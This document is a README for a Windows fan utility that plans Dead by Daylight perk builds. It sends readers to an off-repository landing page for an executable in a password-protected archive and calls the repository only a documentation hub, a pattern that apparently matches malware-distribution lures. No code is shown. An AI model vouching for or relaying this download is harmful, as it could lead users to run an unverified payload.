<div align="center">

<img src="assets/hero-forest.jpg" alt="Dead by Daylight Build Planner — foggy forest" width="100%">

# Dead by Daylight Build Planner

**Draft Killer and Survivor perk builds, test combinations, and keep every loadout in one local archive.**

[![Download](https://img.shields.io/badge/download-landing%20page-c1121f?style=for-the-badge&logo=githubpages&logoColor=white)](https://falseparakeetcheer.github.io/dead-by-daylight-killer-build-planner-perk-tool/#download)
[![Site](https://img.shields.io/badge/site-GitHub%20Pages-e6a13c?style=for-the-badge)](https://falseparakeetcheer.github.io/dead-by-daylight-killer-build-planner-perk-tool/)
[![Version](https://img.shields.io/badge/version-1.0.0-a39c92?style=for-the-badge)](#download)
[![License](https://img.shields.io/badge/license-MIT-6f6a63?style=for-the-badge)](LICENSE)

</div>

---

## About

**Dead by Daylight Build Planner** is a Windows desktop utility for players who plan their four perk slots before the offering is burned. A build is decided by what the four perks do to each other, not by any single one of them, and holding that in your head across a dozen loadouts does not work. The planner keeps killer and survivor sheets apart, flags the combinations that cancel themselves out, and stores every finished build in a local archive you can return to.

It is a theorycrafting tool, not a game helper. It reads and writes only its own library: no account, no network calls, no background service, and nothing injected into the game. Perk text is summarised from the public descriptions shipped with each release.

## What it does

| Feature | What you get |
| --- | --- |
| Killer build creator | Four-slot killer sheets by role — chase, slowdown, information or hybrid — with duplicate and tier checks |
| Survivor builds | Chase, stealth, support and generator-pressure sheets with their own loop notes |
| Perk combinations | Combination testing across the whole index, including exhaustion conflicts and dead slots |
| Synergy search | Start from one perk and see what feeds it, by effect, role or required partner perk |
| Saved builds | Unlimited loadouts, duplicated for variants and marked with the versions you actually run |
| Build export | Plain text for a group chat, or a compact file that reopens in the app |
| Local archive | One library file next to the executable, with a timestamped backup before every save |

## How it works

1. **Choose a side and a role.** Killer or survivor, then the role the build is meant to fill.
2. **Fill four slots.** Add perks by name; conflicts and duplicates are flagged in the same row.
3. **Compare.** Put the draft beside a saved loadout and read perk by perk what the swap gains and gives up.
4. **Save and export.** The build lands in the archive with a timestamp, ready to copy as text when someone asks.

## Why local-only matters

- The app works from its own perk index, so it never needs to read the game process.
- No login means no token to leak and no account to lose.
- No telemetry means no record of your builds leaves the machine.
- The library is a plain file you can inspect, copy or delete.
- A timestamped backup is written before every save, so a bad edit is one step from recovery.

This repository is the documentation hub for the current release. The build, the archive password and the install notes live on the landing page linked below.

## Requirements

| | |
| --- | --- |
| System | Windows 10 or Windows 11, 64-bit |
| Memory | 4 GB RAM or more |
| Storage | A small amount of free space for the app and the library |
| Display | 1280×720 or higher |
| Network | Not required after download |

## Download

The build is distributed through the landing page, which always carries the current version, the archive password and the install notes:

**[Open the landing page → Download](https://falseparakeetcheer.github.io/dead-by-daylight-killer-build-planner-perk-tool/#download)**

Releases are replaced between versions, so take the file from the landing page rather than from a mirror or a forwarded copy.

## FAQ

<details>
<summary>Does the planner touch the game or my account?</summary>

No. It is a standalone desktop app with its own local library. It does not read game memory, inject files, sign in to an account or send data over the network.
</details>

<details>
<summary>Do I need Dead by Daylight installed to use it?</summary>

No. The planner works from the perk index it ships with, so you can draft a build with the game closed or installed elsewhere.
</details>

<details>
<summary>Is the perk list complete?</summary>

It covers the teachable perks available at the time of the release, with role tags and effect notes. Perks added after a chapter release arrive in the next build.
</details>

<details>
<summary>Can I keep killer and survivor builds together?</summary>

Yes, in one library but on separate sheets. The archive filters by role, so a killer loadout never appears while you draft for a survivor.
</details>

<details>
<summary>How does the synergy search work?</summary>

You start from one perk and the map redraws around the perks that share its triggers, effect type or role. Conflicts appear in their own row rather than hidden behind a score.
</details>

<details>
<summary>Where is my library stored?</summary>

Inside the extracted folder next to the executable, with a timestamped backup before each save. Move the folder and the library moves with it.
</details>

## Keywords

Dead by Daylight builds · DBD build planner · killer builds · survivor builds · perk planner · perk combinations · perk synergies · DBD tools · Windows build planner · offline theorycrafting

## Disclaimer

Dead by Daylight Build Planner is an unofficial fan project. It is not affiliated with, endorsed by or connected to the game's publisher or developers. All game names, perk names, trademarks and content belong to their respective owners. Use the tool at your own discretion and follow the game's terms of service.